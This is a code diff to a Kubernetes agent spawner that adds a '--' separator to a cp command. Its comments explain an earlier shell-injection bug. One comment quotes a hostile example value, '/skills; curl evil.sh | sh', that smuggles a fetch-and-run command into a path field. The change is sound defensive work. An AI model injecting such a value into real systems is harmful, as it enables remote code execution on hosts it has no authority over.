@@ -186,7 +186,10 @@ class KubernetesSpawner(AgentSpawner):
                     # field with no validation (issue #202); interpolating it
                     # into a shell string let a value like
                     # "/skills; curl evil.sh | sh" execute arbitrary commands.
-                    command=["cp", "-r", *copy_paths, "/skills-data"],
+                    # The "--" separator stops an option-shaped path (e.g.
+                    # "-t") from being parsed as a cp flag instead of a
+                    # literal source path.
+                    command=["cp", "-r", "--", *copy_paths, "/skills-data"],
                     volume_mounts=[
                         client.V1VolumeMount(
                             name="skills-data",
